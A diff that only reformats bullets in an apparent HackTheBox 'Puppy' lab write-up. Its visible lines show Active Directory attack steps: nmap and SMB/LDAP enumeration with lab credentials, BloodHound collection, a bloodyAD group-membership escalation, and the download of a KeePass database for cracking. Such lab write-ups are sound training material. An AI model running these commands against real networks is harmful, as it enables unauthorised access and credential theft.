@@ -26,9 +26,9 @@ PORT     STATE SERVICE
 2049/tcp open  nfs
 ```
 
-- Standard Windows AD/DC ports detected: DNS, Kerberos, LDAP, SMB, NFS.
+Standard Windows AD/DC ports detected: DNS, Kerberos, LDAP, SMB, NFS.
     
-- Target likely an Active Directory domain controller.
+Target likely an Active Directory domain controller.
     
 
 ---
@@ -71,11 +71,11 @@ Host script results:
 |_  start_date: N/A
 ```
 
-- Full TCP scan confirms Windows domain controller with SMB signing required.
+Full TCP scan confirms Windows domain controller with SMB signing required.
     
-- Many standard AD services exposed: LDAP, Kerberos, SMB, HTTP endpoints.
+Many standard AD services exposed: LDAP, Kerberos, SMB, HTTP endpoints.
     
-- Clock skew observed (7h).
+Clock skew observed (7h).
     
 
 ---
@@ -92,7 +92,7 @@ dig axfr puppy.htb @10.10.11.70
 ; Transfer failed.
 ```
 
-- Zone transfer not allowed.
+Zone transfer not allowed.
     
 
 ```bash
@@ -104,7 +104,7 @@ dig txt puppy.htb @10.10.11.70
 puppy.htb. 3600 IN SOA dc.puppy.htb. hostmaster.puppy.htb. 176 900 600 86400 3600
 ```
 
-- TXT query confirms authoritative SOA record and DC hostname.
+TXT query confirms authoritative SOA record and DC hostname.
     
 
 ---
@@ -124,7 +124,7 @@ Anonymous login successful
 SMB1 disabled -- no workgroup available
 ```
 
-- Anonymous login allowed, but no SMB1 shares available.
+Anonymous login allowed, but no SMB1 shares available.
     
 
 #### Authenticated Share Enumeration
@@ -145,9 +145,9 @@ smbmap -H puppy.htb -u 'levi.james' -p 'KingofAkron2025!'
         SYSVOL   READ ONLY
 ```
 
-- Authenticated user levi.james can access IPC$, NETLOGON, SYSVOL shares read-only.
+Authenticated user levi.james can access IPC$, NETLOGON, SYSVOL shares read-only.
     
-- DEV share exists but not listable.
+DEV share exists but not listable.
     
 
 ---
@@ -169,9 +169,9 @@ nmap --script=ldap* -p 389 10.10.11.70 -Pn -T4
 |_  dnsHostName: DC.PUPPY.HTB
 ```
 
-- LDAP rootDSE confirms domain structure: DC=PUPPY,DC=HTB.
+LDAP rootDSE confirms domain structure: DC=PUPPY,DC=HTB.
     
-- Forest and domain functional levels at 7 (Windows Server 2016+).
+Forest and domain functional levels at 7 (Windows Server 2016+).
     
 
 ---
@@ -224,7 +224,7 @@ user:[steph.cooper] rid:[0x453]
 user:[steph.cooper_adm] rid:[0x457]
 ```
 
-- Domain Users discovered: Administrator, Guest, krbtgt, levi.james, ant.edwards, adam.silver, jamie.williams, steph.cooper, steph.cooper_adm
+Domain Users discovered: Administrator, Guest, krbtgt, levi.james, ant.edwards, adam.silver, jamie.williams, steph.cooper, steph.cooper_adm
     
 
 ```bash
@@ -237,7 +237,7 @@ group:[SENIOR DEVS] rid:[0x455]
 group:[HR] rid:[0x454]
 ```
 
-- Groups discovered: Domain Admins, DEVELOPERS, SENIOR DEVS, HR
+Groups discovered: Domain Admins, DEVELOPERS, SENIOR DEVS, HR
     
 
 ---
@@ -280,7 +280,7 @@ Run BloodHound mapping
 bloodhound-python -u 'levi.james' -p 'KingofAkron2025!' -d puppy.htb -ns 10.10.11.70 -c All --zip
 ```
 
-- BloodHound confirms 1 domain, 1 computer, 10 users, 56 groups.
+BloodHound confirms 1 domain, 1 computer, 10 users, 56 groups.
 
 ![puppy_1](https://gianlucabassani.github.io/assets/puppy/puppy_1.jpg)
 
@@ -293,7 +293,7 @@ Since we have GenercWrite over develpoers group we can add ourself to DEV group:
 bloodyAD --host '10.10.11.70' -d 'dc.puppy.htb' -u 'levi.james' -p 'KingofAkron2025!' add groupMember DEVELOPERS levi.james  
 ```
 
-- levi.james added to DEVELOPERS
+levi.james added to DEVELOPERS.
 
 ```bash
 smbclient //10.10.11.70/DEV -U 'levi.james'
@@ -312,7 +312,7 @@ smb: \> get KeePassXC-2.7.9-Win64.msi
 smb: \> get recovery.kdbx  
 ```
 
-- DEV share contains KeePass installer and recovery.kdbx file.
+DEV share contains KeePass installer and recovery.kdbx file.
     
 
 ```bash
@@ -323,7 +323,7 @@ file recovery.kdbx
 recovery.kdbx: Keepass password database 2.x KDBX
 ```
 
-- KeePass database detected.
+KeePass database detected.
 
 If we try to bruteforce the recovery.kdbx with john it fails:
 ```
